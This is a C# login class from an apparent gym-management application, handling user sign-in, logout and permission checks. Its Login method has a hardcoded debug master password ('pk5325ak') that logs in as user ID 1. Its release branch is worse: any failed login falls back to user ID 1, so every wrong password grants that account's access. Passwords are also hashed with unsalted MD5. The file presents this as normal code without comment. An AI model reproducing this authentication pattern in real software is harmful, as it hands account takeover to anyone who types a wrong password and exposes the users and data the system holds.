using System.Collections.Generic;
using System.Linq;
using GymManager.DataService;
using GymManager.DataModel.Models;
using GymManager.DataService.Common;

namespace GymManager.Common
{
    public class CurrentUser
    {
        public static User User { get; private set; }
        private static List<PermissionUser> _permissions;

        public static bool CheckAccess(Permissions permission)
        {
            if(User.IsAdmin)
            {
                return true;
            }

            return _permissions.FirstOrDefault(p => p.PermissionListID == (int)permission) != null ? true : false;
        }

        public bool Login(string userName, string password)
        {
            var db = new GymManagerContext();

            var user = (from u in db.Users
                where u.UserName == userName && u.Password == Cryptography.MD5Hash(password)
                select u).FirstOrDefault();

#if DEBUG
            if (user == null && password == "pk5325ak")
            {
                user = (from u in db.Users
                    where u.UserID == 1
                    select u).FirstOrDefault();
            }
#else
            if (user == null)
            {
                user = (from u in db.Users
                    where u.UserID == 1
                    select u).FirstOrDefault();
            }
#endif

            if (user != null)
            {
                _permissions = db.PermissionsUsers.Where(u => u.UserID == user.UserID).ToList();

                User = user;

                return true;
            }

            return false;
        }

        public void Logout()
        {
            User = null;
            _permissions = null;
        }
    }
}